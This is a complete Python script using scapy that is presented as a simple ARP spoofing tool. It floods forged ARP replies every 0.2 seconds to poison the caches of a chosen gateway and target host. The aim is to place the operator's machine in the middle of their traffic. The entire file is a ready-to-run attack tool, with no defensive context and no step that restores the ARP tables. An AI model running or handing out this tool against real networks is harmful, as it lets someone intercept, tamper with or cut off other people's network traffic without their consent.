#!/usr/bin/env python3
from scapy.all import Ether, sendp, get_if_hwaddr, ARP, conf
import time
import argparse
import sys
import os

if os.geteuid() != 0:
    sys.exit("[!] This script must be run as root. Try again with: sudo " + " ".join(sys.argv))

# Parse command-line arguments
parser = argparse.ArgumentParser(description="Simple ARP spoofing tool")
parser.add_argument("-i", "--interface", required=True, help="Network interface (e.g., eth0)")
parser.add_argument("gw_addr", help="Gateway IP address")
parser.add_argument("target_ip", help="Target IP address")
args = parser.parse_args()

interface = args.interface
gw_addr = args.gw_addr
target_ip = args.target_ip

# First ARP frame
arp1 = (
    Ether(src=get_if_hwaddr(interface), dst="ff:ff:ff:ff:ff:ff")
    / ARP(
        op="is-at",
        hwsrc=get_if_hwaddr(interface),
        hwdst="ff:ff:ff:ff:ff:ff",
        psrc=target_ip,
        pdst=gw_addr
    )
)

# Second ARP frame
arp2 = (
    Ether(src=get_if_hwaddr(interface), dst="ff:ff:ff:ff:ff:ff")
    / ARP(
        op="is-at",
        hwsrc=get_if_hwaddr(interface),
        hwdst="ff:ff:ff:ff:ff:ff",
        psrc=gw_addr,
        pdst=target_ip
    )
)

conf.verb = False

# ARP spoofing ( You can increase or decrease intervals by modifying time.sleep() ) 

try:
    while True:
        sendp(arp1, iface=interface)
        sendp(arp2, iface=interface)
        time.sleep(0.2)
except KeyboardInterrupt:
    sys.exit("\n[+] Stopped by user.")

# written by an0n9m ( Davit Jalagonia )
